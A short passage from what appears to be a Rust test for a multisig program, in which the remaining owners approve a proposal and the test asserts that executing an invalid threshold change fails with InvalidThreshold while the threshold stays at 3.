    for owner in &owners[1..] {
        sim.process_ix(ms::approve(owner, &multisig, 1), &[*owner])
            .unwrap();
    }
    assert_custom(
        sim.process_ix(ms::execute(&owners[0], &multisig, 1, &bad), &[owners[0]]),
        ms::MultisigError::InvalidThreshold,
    );
    assert_eq!(load_multisig(&sim, &multisig).threshold, 3);
}
